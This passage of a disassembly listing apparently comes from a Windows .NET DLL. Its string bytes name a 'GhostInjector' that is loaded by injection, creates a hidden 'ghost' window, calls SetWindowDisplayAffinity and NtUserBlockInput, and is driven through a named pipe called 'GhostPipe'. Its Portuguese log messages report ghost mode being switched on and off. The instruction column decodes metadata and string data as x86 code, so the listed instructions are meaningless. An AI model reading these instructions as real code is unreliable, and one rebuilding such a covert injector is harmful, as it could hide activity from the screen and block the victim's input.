1000316c:	73 74                	jae    0x100031e2
1000316e:	65 6d                	gs insl (%dx),%es:(%edi)
10003170:	2e 52                	cs push %edx
10003172:	75 6e                	jne    0x100031e2
10003174:	74 69                	je     0x100031df
10003176:	6d                   	insl   (%dx),%es:(%edi)
10003177:	65 2e 43             	gs cs inc %ebx
1000317a:	6f                   	outsl  %ds:(%esi),(%dx)
1000317b:	6d                   	insl   (%dx),%es:(%edi)
1000317c:	70 69                	jo     0x100031e7
1000317e:	6c                   	insb   (%dx),%es:(%edi)
1000317f:	65 72 53             	gs jb  0x100031d5
10003182:	65 72 76             	gs jb  0x100031fb
10003185:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
1000318c:	62 75 67             	bound  %esi,0x67(%ebp)
1000318f:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
10003196:	65 
10003197:	73 00                	jae    0x10003199
10003199:	53                   	push   %ebx
1000319a:	79 73                	jns    0x1000320f
1000319c:	74 65                	je     0x10003203
1000319e:	6d                   	insl   (%dx),%es:(%edi)
1000319f:	2e 49                	cs dec %ecx
100031a1:	4f                   	dec    %edi
100031a2:	2e 50                	cs push %eax
100031a4:	69 70 65 73 00 53 79 	imul   $0x79530073,0x65(%eax),%esi
100031ab:	73 74                	jae    0x10003221
100031ad:	65 6d                	gs insl (%dx),%es:(%edi)
100031af:	2e 57                	cs push %edi
100031b1:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
100031b8:	46                   	inc    %esi
100031b9:	6f                   	outsl  %ds:(%esi),(%dx)
100031ba:	72 6d                	jb     0x10003229
100031bc:	73 00                	jae    0x100031be
100031be:	67 65 74 5f          	addr16 gs je 0x10003221
100031c2:	41                   	inc    %ecx
100031c3:	6c                   	insb   (%dx),%es:(%edi)
100031c4:	6c                   	insb   (%dx),%es:(%edi)
100031c5:	53                   	push   %ebx
100031c6:	63 72 65             	arpl   %esi,0x65(%edx)
100031c9:	65 6e                	outsb  %gs:(%esi),(%dx)
100031cb:	73 00                	jae    0x100031cd
100031cd:	50                   	push   %eax
100031ce:	69 70 65 4f 70 74 69 	imul   $0x6974704f,0x65(%eax),%esi
100031d5:	6f                   	outsl  %ds:(%esi),(%dx)
100031d6:	6e                   	outsb  %ds:(%esi),(%dx)
100031d7:	73 00                	jae    0x100031d9
100031d9:	6c                   	insb   (%dx),%es:(%edi)
100031da:	70 57                	jo     0x10003233
100031dc:	6e                   	outsb  %ds:(%esi),(%dx)
100031dd:	64 43                	fs inc %ebx
100031df:	6c                   	insb   (%dx),%es:(%edi)
100031e0:	61                   	popa
100031e1:	73 73                	jae    0x10003256
100031e3:	00 52 65             	add    %dl,0x65(%edx)
100031e6:	67 69 73 74 65 72 43 	imul   $0x6c437265,0x74(%bp,%di),%esi
100031ed:	6c 
100031ee:	61                   	popa
100031ef:	73 73                	jae    0x10003264
100031f1:	00 66 42             	add    %ah,0x42(%esi)
100031f4:	6c                   	insb   (%dx),%es:(%edi)
100031f5:	6f                   	outsl  %ds:(%esi),(%dx)
100031f6:	63 6b 49             	arpl   %ebp,0x49(%ebx)
100031f9:	74 00                	je     0x100031fb
100031fb:	43                   	inc    %ebx
100031fc:	6f                   	outsl  %ds:(%esi),(%dx)
100031fd:	6e                   	outsb  %ds:(%esi),(%dx)
100031fe:	63 61 74             	arpl   %esp,0x74(%ecx)
10003201:	00 4f 62             	add    %cl,0x62(%edi)
10003204:	6a 65                	push   $0x65
10003206:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
1000320a:	62 6a 65             	bound  %ebp,0x65(%edx)
1000320d:	63 74 00 44          	arpl   %esi,0x44(%eax,%eax,1)
10003211:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
10003218:	63 74 00 67          	arpl   %esi,0x67(%eax,%eax,1)
1000321c:	65 74 5f             	gs je  0x1000327e
1000321f:	48                   	dec    %eax
10003220:	65 69 67 68 74 00 6e 	imul   $0x486e0074,%gs:0x68(%edi),%esp
10003227:	48 
10003228:	65 69 67 68 74 00 6f 	imul   $0x706f0074,%gs:0x68(%edi),%esp
1000322f:	70 
10003230:	5f                   	pop    %edi
10003231:	45                   	inc    %ebp
10003232:	78 70                	js     0x100032a4
10003234:	6c                   	insb   (%dx),%es:(%edi)
10003235:	69 63 69 74 00 49 41 	imul   $0x41490074,0x69(%ebx),%esp
1000323c:	73 79                	jae    0x100032b7
1000323e:	6e                   	outsb  %ds:(%esi),(%dx)
1000323f:	63 52 65             	arpl   %edx,0x65(%edx)
10003242:	73 75                	jae    0x100032b9
10003244:	6c                   	insb   (%dx),%es:(%edi)
10003245:	74 00                	je     0x10003247
10003247:	72 65                	jb     0x100032ae
10003249:	73 75                	jae    0x100032c0
1000324b:	6c                   	insb   (%dx),%es:(%edi)
1000324c:	74 00                	je     0x1000324e
1000324e:	68 57 6e 64 50       	push   $0x50646e57
10003253:	61                   	popa
10003254:	72 65                	jb     0x100032bb
10003256:	6e                   	outsb  %ds:(%esi),(%dx)
10003257:	74 00                	je     0x10003259
10003259:	54                   	push   %esp
1000325a:	68 72 65 61 64       	push   $0x64616572
1000325f:	53                   	push   %ebx
10003260:	74 61                	je     0x100032c3
10003262:	72 74                	jb     0x100032d8
10003264:	00 45 6e             	add    %al,0x6e(%ebp)
10003267:	61                   	popa
10003268:	62 6c 65 47          	bound  %ebp,0x47(%ebp,%eiz,2)
1000326c:	68 6f 73 74 00       	push   $0x74736f
10003271:	44                   	inc    %esp
10003272:	69 73 61 62 6c 65 47 	imul   $0x47656c62,0x61(%ebx),%esi
10003279:	68 6f 73 74 00       	push   $0x74736f
1000327e:	4e                   	dec    %esi
1000327f:	74 55                	je     0x100032d6
10003281:	73 65                	jae    0x100032e8
10003283:	72 42                	jb     0x100032c7
10003285:	6c                   	insb   (%dx),%es:(%edi)
10003286:	6f                   	outsl  %ds:(%esi),(%dx)
10003287:	63 6b 49             	arpl   %ebp,0x49(%ebx)
1000328a:	6e                   	outsb  %ds:(%esi),(%dx)
1000328b:	70 75                	jo     0x10003302
1000328d:	74 00                	je     0x1000328f
1000328f:	68 4d 65 6e 75       	push   $0x756e654d
10003294:	00 55 70             	add    %dl,0x70(%ebp)
10003297:	64 61                	fs popa
10003299:	74 65                	je     0x10003300
1000329b:	57                   	push   %edi
1000329c:	69 6e 64 6f 77 00 43 	imul   $0x4300776f,0x64(%esi),%ebp
100032a3:	72 65                	jb     0x1000330a
100032a5:	61                   	popa
100032a6:	74 65                	je     0x1000330d
100032a8:	47                   	inc    %edi
100032a9:	68 6f 73 74 57       	push   $0x5774736f
100032ae:	69 6e 64 6f 77 00 44 	imul   $0x4400776f,0x64(%esi),%ebp
100032b5:	65 73 74             	gs jae 0x1000332c
100032b8:	72 6f                	jb     0x10003329
100032ba:	79 47                	jns    0x10003303
100032bc:	68 6f 73 74 57       	push   $0x5774736f
100032c1:	69 6e 64 6f 77 00 53 	imul   $0x5300776f,0x64(%esi),%ebp
100032c8:	68 6f 77 57 69       	push   $0x6957776f
100032cd:	6e                   	outsb  %ds:(%esi),(%dx)
100032ce:	64 6f                	outsl  %fs:(%esi),(%dx)
100032d0:	77 00                	ja     0x100032d2
100032d2:	44                   	inc    %esp
100032d3:	65 73 74             	gs jae 0x1000334a
100032d6:	72 6f                	jb     0x10003347
100032d8:	79 57                	jns    0x10003331
100032da:	69 6e 64 6f 77 00 62 	imul   $0x6200776f,0x64(%esi),%ebp
100032e1:	53                   	push   %ebx
100032e2:	68 6f 77 00 6e       	push   $0x6e00776f
100032e7:	43                   	inc    %ebx
100032e8:	6d                   	insl   (%dx),%es:(%edi)
100032e9:	64 53                	fs push %ebx
100032eb:	68 6f 77 00 43       	push   $0x4300776f
100032f0:	72 65                	jb     0x10003357
100032f2:	61                   	popa
100032f3:	74 65                	je     0x1000335a
100032f5:	57                   	push   %edi
100032f6:	69 6e 64 6f 77 45 78 	imul   $0x7845776f,0x64(%esi),%ebp
100032fd:	00 6f 70             	add    %ch,0x70(%edi)
10003300:	5f                   	pop    %edi
10003301:	45                   	inc    %ebp
10003302:	71 75                	jno    0x10003379
10003304:	61                   	popa
10003305:	6c                   	insb   (%dx),%es:(%edi)
10003306:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
1000330d:	49 
1000330e:	6e                   	outsb  %ds:(%esi),(%dx)
1000330f:	65 71 75             	gs jno 0x10003387
10003312:	61                   	popa
10003313:	6c                   	insb   (%dx),%es:(%edi)
10003314:	69 74 79 00 64 77 41 	imul   $0x66417764,0x0(%ecx,%edi,2),%esi
1000331b:	66 
1000331c:	66 69 6e 69 74 79    	imul   $0x7974,0x69(%esi),%bp
10003322:	00 53 65             	add    %dl,0x65(%ebx)
10003325:	74 57                	je     0x1000337e
10003327:	69 6e 64 6f 77 44 69 	imul   $0x6944776f,0x64(%esi),%ebp
1000332e:	73 70                	jae    0x100033a0
10003330:	6c                   	insb   (%dx),%es:(%edi)
10003331:	61                   	popa
10003332:	79 41                	jns    0x10003375
10003334:	66 66 69 6e 69 74 79 	data16 imul $0x7974,0x69(%esi),%bp
1000333b:	00 00                	add    %al,(%eax)
1000333d:	57                   	push   %edi
1000333e:	5b                   	pop    %ebx
1000333f:	00 47 00             	add    %al,0x0(%edi)
10003342:	68 00 6f 00 73       	push   $0x73006f00
10003347:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
1000334b:	00 6e 00             	add    %ch,0x0(%esi)
1000334e:	6a 00                	push   $0x0
10003350:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10003354:	74 00                	je     0x10003356
10003356:	6f                   	outsl  %ds:(%esi),(%dx)
10003357:	00 72 00             	add    %dh,0x0(%edx)
1000335a:	5d                   	pop    %ebp
1000335b:	00 20                	add    %ah,(%eax)
1000335d:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
10003361:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
10003365:	00 63 00             	add    %ah,0x0(%ebx)
10003368:	61                   	popa
10003369:	00 72 00             	add    %dh,0x0(%edx)
1000336c:	72 00                	jb     0x1000336e
1000336e:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
10003372:	61                   	popa
10003373:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
10003377:	00 2e                	add    %ch,(%esi)
10003379:	00 20                	add    %ah,(%eax)
1000337b:	00 49 00             	add    %cl,0x0(%ecx)
1000337e:	6e                   	outsb  %ds:(%esi),(%dx)
1000337f:	00 69 00             	add    %ch,0x0(%ecx)
10003382:	63 00                	arpl   %eax,(%eax)
10003384:	69 00 61 00 6e 00    	imul   $0x6e0061,(%eax),%eax
1000338a:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
1000338e:	2e 00 2e             	add    %ch,%cs:(%esi)
10003391:	00 2e                	add    %ch,(%esi)
10003393:	00 00                	add    %al,(%eax)
10003395:	59                   	pop    %ecx
10003396:	5b                   	pop    %ebx
10003397:	00 47 00             	add    %al,0x0(%edi)
1000339a:	68 00 6f 00 73       	push   $0x73006f00
1000339f:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
100033a3:	00 6e 00             	add    %ch,0x0(%esi)
100033a6:	6a 00                	push   $0x0
100033a8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100033ac:	74 00                	je     0x100033ae
100033ae:	6f                   	outsl  %ds:(%esi),(%dx)
100033af:	00 72 00             	add    %dh,0x0(%edx)
100033b2:	5d                   	pop    %ebp
100033b3:	00 20                	add    %ah,(%eax)
100033b5:	00 46 00             	add    %al,0x0(%esi)
100033b8:	61                   	popa
100033b9:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
100033bd:	00 61 00             	add    %ah,0x0(%ecx)
100033c0:	20 00                	and    %al,(%eax)
100033c2:	61                   	popa
100033c3:	00 6f 00             	add    %ch,0x0(%edi)
100033c6:	20 00                	and    %al,(%eax)
100033c8:	63 00                	arpl   %eax,(%eax)
100033ca:	72 00                	jb     0x100033cc
100033cc:	69 00 61 00 72 00    	imul   $0x720061,(%eax),%eax
100033d2:	20 00                	and    %al,(%eax)
100033d4:	67 00 68 00          	add    %ch,0x0(%bx,%si)
100033d8:	6f                   	outsl  %ds:(%esi),(%dx)
100033d9:	00 73 00             	add    %dh,0x0(%ebx)
100033dc:	74 00                	je     0x100033de
100033de:	20 00                	and    %al,(%eax)
100033e0:	77 00                	ja     0x100033e2
100033e2:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
100033e8:	6f                   	outsl  %ds:(%esi),(%dx)
100033e9:	00 77 00             	add    %dh,0x0(%edi)
100033ec:	2e 00 00             	add    %al,%cs:(%eax)
100033ef:	47                   	inc    %edi
100033f0:	5b                   	pop    %ebx
100033f1:	00 47 00             	add    %al,0x0(%edi)
100033f4:	68 00 6f 00 73       	push   $0x73006f00
100033f9:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
100033fd:	00 6e 00             	add    %ch,0x0(%esi)
10003400:	6a 00                	push   $0x0
10003402:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10003406:	74 00                	je     0x10003408
10003408:	6f                   	outsl  %ds:(%esi),(%dx)
10003409:	00 72 00             	add    %dh,0x0(%edx)
1000340c:	5d                   	pop    %ebp
1000340d:	00 20                	add    %ah,(%eax)
1000340f:	00 47 00             	add    %al,0x0(%edi)
10003412:	68 00 6f 00 73       	push   $0x73006f00
10003417:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
1000341b:	00 6d 00             	add    %ch,0x0(%ebp)
1000341e:	6f                   	outsl  %ds:(%esi),(%dx)
1000341f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
10003423:	00 20                	add    %ah,(%eax)
10003425:	00 61 00             	add    %ah,0x0(%ecx)
10003428:	74 00                	je     0x1000342a
1000342a:	69 00 76 00 61 00    	imul   $0x610076,(%eax),%eax
10003430:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
10003434:	2e 00 00             	add    %al,%cs:(%eax)
10003437:	45                   	inc    %ebp
10003438:	5b                   	pop    %ebx
10003439:	00 47 00             	add    %al,0x0(%edi)
1000343c:	68 00 6f 00 73       	push   $0x73006f00
10003441:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
10003445:	00 6e 00             	add    %ch,0x0(%esi)
10003448:	6a 00                	push   $0x0
1000344a:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
1000344e:	74 00                	je     0x10003450
10003450:	6f                   	outsl  %ds:(%esi),(%dx)
10003451:	00 72 00             	add    %dh,0x0(%edx)
10003454:	5d                   	pop    %ebp
10003455:	00 20                	add    %ah,(%eax)
10003457:	00 45 00             	add    %al,0x0(%ebp)
1000345a:	72 00                	jb     0x1000345c
1000345c:	72 00                	jb     0x1000345e
1000345e:	6f                   	outsl  %ds:(%esi),(%dx)
1000345f:	00 20                	add    %ah,(%eax)
10003461:	00 45 00             	add    %al,0x0(%ebp)
10003464:	6e                   	outsb  %ds:(%esi),(%dx)
10003465:	00 61 00             	add    %ah,0x0(%ecx)
10003468:	62 00                	bound  %eax,(%eax)
1000346a:	6c                   	insb   (%dx),%es:(%edi)
1000346b:	00 65 00             	add    %ah,0x0(%ebp)
1000346e:	47                   	inc    %edi
1000346f:	00 68 00             	add    %ch,0x0(%eax)
10003472:	6f                   	outsl  %ds:(%esi),(%dx)
10003473:	00 73 00             	add    %dh,0x0(%ebx)
10003476:	74 00                	je     0x10003478
10003478:	3a 00                	cmp    (%eax),%al
1000347a:	20 00                	and    %al,(%eax)
1000347c:	00 4d 5b             	add    %cl,0x5b(%ebp)
1000347f:	00 47 00             	add    %al,0x0(%edi)
10003482:	68 00 6f 00 73       	push   $0x73006f00
10003487:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
1000348b:	00 6e 00             	add    %ch,0x0(%esi)
1000348e:	6a 00                	push   $0x0
10003490:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10003494:	74 00                	je     0x10003496
10003496:	6f                   	outsl  %ds:(%esi),(%dx)
10003497:	00 72 00             	add    %dh,0x0(%edx)
1000349a:	5d                   	pop    %ebp
1000349b:	00 20                	add    %ah,(%eax)
1000349d:	00 47 00             	add    %al,0x0(%edi)
100034a0:	68 00 6f 00 73       	push   $0x73006f00
100034a5:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
100034a9:	00 6d 00             	add    %ch,0x0(%ebp)
100034ac:	6f                   	outsl  %ds:(%esi),(%dx)
100034ad:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
100034b1:	00 20                	add    %ah,(%eax)
100034b3:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
100034b7:	00 73 00             	add    %dh,0x0(%ebx)
100034ba:	61                   	popa
100034bb:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
100034bf:	00 76 00             	add    %dh,0x0(%esi)
100034c2:	61                   	popa
100034c3:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
100034c7:	00 2e                	add    %ch,(%esi)
100034c9:	00 00                	add    %al,(%eax)
100034cb:	47                   	inc    %edi
100034cc:	5b                   	pop    %ebx
100034cd:	00 47 00             	add    %al,0x0(%edi)
100034d0:	68 00 6f 00 73       	push   $0x73006f00
100034d5:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
100034d9:	00 6e 00             	add    %ch,0x0(%esi)
100034dc:	6a 00                	push   $0x0
100034de:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
100034e2:	74 00                	je     0x100034e4
100034e4:	6f                   	outsl  %ds:(%esi),(%dx)
100034e5:	00 72 00             	add    %dh,0x0(%edx)
100034e8:	5d                   	pop    %ebp
100034e9:	00 20                	add    %ah,(%eax)
100034eb:	00 45 00             	add    %al,0x0(%ebp)
100034ee:	72 00                	jb     0x100034f0
100034f0:	72 00                	jb     0x100034f2
100034f2:	6f                   	outsl  %ds:(%esi),(%dx)
100034f3:	00 20                	add    %ah,(%eax)
100034f5:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
100034f9:	00 73 00             	add    %dh,0x0(%ebx)
100034fc:	61                   	popa
100034fd:	00 62 00             	add    %ah,0x0(%edx)
10003500:	6c                   	insb   (%dx),%es:(%edi)
10003501:	00 65 00             	add    %ah,0x0(%ebp)
10003504:	47                   	inc    %edi
10003505:	00 68 00             	add    %ch,0x0(%eax)
10003508:	6f                   	outsl  %ds:(%esi),(%dx)
10003509:	00 73 00             	add    %dh,0x0(%ebx)
1000350c:	74 00                	je     0x1000350e
1000350e:	3a 00                	cmp    (%eax),%al
10003510:	20 00                	and    %al,(%eax)
10003512:	00 03                	add    %al,(%ebx)
10003514:	4e                   	dec    %esi
10003515:	00 00                	add    %al,(%eax)
10003517:	01 00                	add    %eax,(%eax)
10003519:	49                   	dec    %ecx
1000351a:	5b                   	pop    %ebx
1000351b:	00 47 00             	add    %al,0x0(%edi)
1000351e:	68 00 6f 00 73       	push   $0x73006f00
10003523:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
10003527:	00 6e 00             	add    %ch,0x0(%esi)
1000352a:	6a 00                	push   $0x0
1000352c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
10003530:	74 00                	je     0x10003532
10003532:	6f                   	outsl  %ds:(%esi),(%dx)
10003533:	00 72 00             	add    %dh,0x0(%edx)
10003536:	5d                   	pop    %ebp
10003537:	00 20                	add    %ah,(%eax)
10003539:	00 4a 00             	add    %cl,0x0(%edx)
1000353c:	61                   	popa
1000353d:	00 6e 00             	add    %ch,0x0(%esi)
10003540:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
10003545:	00 20                	add    %ah,(%eax)
10003547:	00 67 00             	add    %ah,0x0(%edi)
1000354a:	68 00 6f 00 73       	push   $0x73006f00
1000354f:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
10003553:	00 63 00             	add    %ah,0x0(%ebx)
10003556:	72 00                	jb     0x10003558
10003558:	69 00 61 00 64 00    	imul   $0x640061,(%eax),%eax
1000355e:	61                   	popa
1000355f:	00 2e                	add    %ch,(%esi)
10003561:	00 00                	add    %al,(%eax)
10003563:	13 47 00             	adc    0x0(%edi),%eax
10003566:	68 00 6f 00 73       	push   $0x73006f00
1000356b:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
1000356f:	00 69 00             	add    %ch,0x0(%ecx)
10003572:	70 00                	jo     0x10003574
10003574:	65 00 00             	add    %al,%gs:(%eax)
10003577:	00 cb                	add    %cl,%bl
10003579:	b7 43                	mov    $0x43,%bh
1000357b:	d4 df                	aam    $0xdf
1000357d:	75 68                	jne    0x100035e7
1000357f:	49                   	dec    %ecx
10003580:	8d                   	lea    (bad),%edx
10003581:	d4 70                	aam    $0x70
10003583:	21 c1                	and    %eax,%ecx
10003585:	19 04 f4             	sbb    %eax,(%esp,%esi,8)
10003588:	00 04 20             	add    %al,(%eax,%eiz,1)
1000358b:	01 01                	add    %eax,(%ecx)
1000358d:	08 03                	or     %al,(%ebx)
1000358f:	20 00                	and    %al,(%eax)
10003591:	01 05 20 01 01 11    	add    %eax,0x11010120
10003597:	11 06                	adc    %eax,(%esi)
10003599:	07                   	pop    %es
1000359a:	02 12                	add    (%edx),%dl
1000359c:	1d 12 19 02 06       	sbb    $0x6021912,%eax
100035a1:	18 04 00             	sbb    %al,(%eax,%eax,1)
100035a4:	00 12                	add    %dl,(%edx)
100035a6:	1d 05 20 02 01       	sbb    $0x1022005,%eax
100035ab:	1c 18                	sbb    $0x18,%al
100035ad:	05 20 01 01 12       	add    $0x12010120,%eax
100035b2:	45                   	inc    %ebp
100035b3:	04 20                	add    $0x20,%al
100035b5:	01 01                	add    %eax,(%ecx)
100035b7:	02 0f                	add    (%edi),%cl
100035b9:	07                   	pop    %es
100035ba:	0b 12                	or     (%edx),%edx
100035bc:	21 1d 05 08 08 02    	and    %ebx,0x2080805
100035c2:	02 02                	add    (%edx),%al
100035c4:	02 02                	add    (%edx),%al
100035c6:	02 02                	add    (%edx),%al
100035c8:	0b 20                	or     (%eax),%esp
100035ca:	05 01 0e 11 4d       	add    $0x4d110e01,%eax
100035cf:	08 11                	or     %dl,(%ecx)
100035d1:	51                   	push   %ecx
100035d2:	11 55 07             	adc    %edx,0x7(%ebp)
100035d5:	20 03                	and    %al,(%ebx)
100035d7:	08 1d 05 08 08 06    	or     %bl,0x6080805
100035dd:	00 02                	add    %al,(%edx)
100035df:	08 1d 05 08 08 07    	or     %bl,0x7080805
100035e5:	05 08 02 02 02       	add    $0x2020208,%eax
100035ea:	12 25 04 00 01 01    	adc    0x1010004,%ah
100035f0:	08 05 00 02 02 18    	or     %al,0x18020200
100035f6:	18 03                	sbb    %al,(%ebx)
100035f8:	20 00                	and    %al,(%eax)
100035fa:	0e                   	push   %cs
100035fb:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
10003600:	0e                   	push   %cs
10003601:	05 07 02 02 12       	add    $0x12020207,%eax
10003606:	25 0d 07 07 11       	and    $0x1107070d,%eax
1000360b:	0c 11                	or     $0x11,%al
1000360d:	29 11                	sub    %edx,(%ecx)
1000360f:	0c 11                	or     $0x11,%al
10003611:	2d 08 02 02 06       	sub    $0x6020208,%eax
10003616:	10 01                	adc    %al,(%ecx)
10003618:	01 18                	add    %ebx,(%eax)
1000361a:	1e                   	push   %ds
1000361b:	00 04 0a             	add    %al,(%edx,%ecx,1)
1000361e:	01 12                	add    %edx,(%edx)
10003620:	10 04 00             	adc    %al,(%eax,%eax,1)
10003623:	00 11                	add    %dl,(%ecx)
10003625:	2d 04 20 01 0e       	sub    $0xe012004,%eax
1000362a:	0e                   	push   %cs
1000362b:	05 00 00 1d 12       	add    $0x121d0000,%eax
10003630:	1d 04 20 00 11       	sbb    $0x11002004,%eax
10003635:	29 08                	sub    %ecx,(%eax)
10003637:	00 02                	add    %al,(%edx)
10003639:	11 29                	adc    %ebp,(%ecx)
1000363b:	11 29                	adc    %ebp,(%ecx)
1000363d:	11 29                	adc    %ebp,(%ecx)
1000363f:	03 20                	add    (%eax),%esp
10003641:	00 08                	add    %cl,(%eax)
10003643:	03 07                	add    (%edi),%eax
10003645:	01 02                	add    %eax,(%edx)
10003647:	04 07                	add    $0x7,%al
10003649:	02 02                	add    (%edx),%al
1000364b:	18 04 00             	sbb    %al,(%eax,%eax,1)
1000364e:	01 18                	add    %ebx,(%eax)
10003650:	08 03                	or     %al,(%ebx)
10003652:	20 00                	and    %al,(%eax)
10003654:	02 04 20             	add    (%eax,%eiz,1),%al
10003657:	01 02                	add    %eax,(%edx)
10003659:	08 07                	or     %al,(%edi)
1000365b:	07                   	pop    %es
1000365c:	05 08 02 02 08       	add    $0x8020208,%eax
10003661:	02 08                	add    (%eax),%cl
10003663:	b7 7a                	mov    $0x7a,%bh
10003665:	5c                   	pop    %esp
10003666:	56                   	push   %esi
10003667:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
1000366a:	89 08                	mov    %ecx,(%eax)
1000366c:	b0 3f                	mov    $0x3f,%al
1000366e:	5f                   	pop    %edi
1000366f:	7f 11                	jg     0x10003682
10003671:	d5 0a                	aad    $0xa
10003673:	3a 04 00             	cmp    (%eax,%eax,1),%al
10003676:	00 00                	add    %al,(%eax)
10003678:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
1000367c:	00 10                	add    %dl,(%eax)
1000367e:	04 80                	add    $0x80,%al
10003680:	00 00                	add    %al,(%eax)
10003682:	00 04 00             	add    %al,(%eax,%eax,1)
10003685:	00 00                	add    %al,(%eax)
10003687:	08 04 20             	or     %al,(%eax,%eiz,1)
1000368a:	00 00                	add    %al,(%eax)
1000368c:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
10003693:	11 00                	adc    %eax,(%eax)
10003695:	00 00                	add    %al,(%eax)
10003697:	02 06                	add    (%esi),%al
10003699:	08 02                	or     %al,(%edx)
1000369b:	06                   	push   %es
1000369c:	09 03                	or     %eax,(%ebx)
1000369e:	06                   	push   %es
1000369f:	12 10                	adc    (%eax),%dl
100036a1:	03 06                	add    (%esi),%eax
100036a3:	12 19                	adc    (%ecx),%bl
100036a5:	02 06                	add    (%esi),%al
100036a7:	02 02                	add    (%edx),%al
100036a9:	06                   	push   %es
100036aa:	0e                   	push   %cs
100036ab:	03 06                	add    (%esi),%eax
100036ad:	12 14 03             	adc    (%ebx,%eax,1),%dl
100036b0:	06                   	push   %es
100036b1:	12 45 03             	adc    0x3(%ebp),%al
100036b4:	00 00                	add    %al,(%eax)
100036b6:	01 04 00             	add    %eax,(%eax,%eax,1)
100036b9:	01 08                	add    %ecx,(%eax)
100036bb:	02 0f                	add    (%edi),%cl
100036bd:	00 0c 18             	add    %cl,(%eax,%ebx,1)
100036c0:	08 0e                	or     %cl,(%esi)
100036c2:	0e                   	push   %cs
100036c3:	08 08                	or     %cl,(%eax)
100036c5:	08 08                	or     %cl,(%eax)
100036c7:	08 18                	or     %bl,(%eax)
100036c9:	18 18                	sbb    %bl,(%eax)
100036cb:	18 05 00 02 02 18    	sbb    %al,0x18020200
100036d1:	08 04 00             	or     %al,(%eax,%eax,1)
100036d4:	01 02                	add    %eax,(%edx)
100036d6:	18 06                	sbb    %al,(%esi)
100036d8:	00 01                	add    %al,(%ecx)
100036da:	08 10                	or     %dl,(%eax)
100036dc:	11 0c 07             	adc    %ecx,(%edi,%eax,1)
100036df:	00 04 18             	add    %al,(%eax,%ebx,1)
100036e2:	18 09                	sbb    %cl,(%ecx)
100036e4:	18 18                	sbb    %bl,(%eax)
100036e6:	05 00 02 02 18       	add    $0x18020200,%eax
100036eb:	09 04 00             	or     %eax,(%eax,%eax,1)
100036ee:	01 18                	add    %ebx,(%eax)
100036f0:	0e                   	push   %cs
100036f1:	04 00                	add    $0x0,%al
100036f3:	01 01                	add    %eax,(%ecx)
100036f5:	0e                   	push   %cs
100036f6:	07                   	pop    %es
100036f7:	20 04 18             	and    %al,(%eax,%ebx,1)
100036fa:	18 09                	sbb    %cl,(%ecx)
100036fc:	18 18                	sbb    %bl,(%eax)
100036fe:	0b 20                	or     (%eax),%esp
10003700:	06                   	push   %es
10003701:	12 39                	adc    (%ecx),%bh
10003703:	18 09                	sbb    %cl,(%ecx)
10003705:	18 18                	sbb    %bl,(%eax)
10003707:	12 3d 1c 05 20 01    	adc    0x120051c,%bh
1000370d:	18 12                	sbb    %dl,(%edx)
1000370f:	39 08                	cmp    %ecx,(%eax)
10003711:	01 00                	add    %eax,(%eax)
10003713:	08 00                	or     %al,(%eax)
10003715:	00 00                	add    %al,(%eax)
10003717:	00 00                	add    %al,(%eax)
10003719:	1e                   	push   %ds
1000371a:	01 00                	add    %eax,(%eax)
1000371c:	01 00                	add    %eax,(%eax)
1000371e:	54                   	push   %esp
1000371f:	02 16                	add    (%esi),%dl
10003721:	57                   	push   %edi
10003722:	72 61                	jb     0x10003785
10003724:	70 4e                	jo     0x10003774
10003726:	6f                   	outsl  %ds:(%esi),(%dx)
10003727:	6e                   	outsb  %ds:(%esi),(%dx)
10003728:	45                   	inc    %ebp
10003729:	78 63                	js     0x1000378e
1000372b:	65 70 74             	gs jo  0x100037a2
1000372e:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
10003735:	77 73                	ja     0x100037aa
10003737:	01 08                	add    %ecx,(%eax)
10003739:	01 00                	add    %eax,(%eax)
1000373b:	07                   	pop    %es
1000373c:	01 00                	add    %eax,(%eax)
1000373e:	00 00                	add    %al,(%eax)
10003740:	00 04 01             	add    %al,(%ecx,%eax,1)
10003743:	00 00                	add    %al,(%eax)
10003745:	00 00                	add    %al,(%eax)
